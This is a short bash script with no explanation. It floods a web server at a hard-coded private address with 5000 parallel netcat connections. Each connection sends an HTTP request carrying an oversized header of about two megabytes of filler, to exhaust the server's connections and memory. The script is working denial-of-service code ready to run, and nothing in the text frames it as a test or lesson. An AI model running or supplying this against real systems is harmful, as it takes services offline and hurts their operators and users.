TARGET=10.1.5.2
CONNS=5000
SIZE_KB=2000

for i in $(seq 1 $CONNS); do
  {
    printf 'GET / HTTP/1.1\r\nHost: %s\r\nX-Big: ' "$TARGET"
    dd if=/dev/zero bs=1K count=$SIZE_KB 2>/dev/null | tr '\0' 'A'
    printf '\r\n\r\n'
  } | nc "$TARGET" 80 > /dev/null 2>&1 &
done
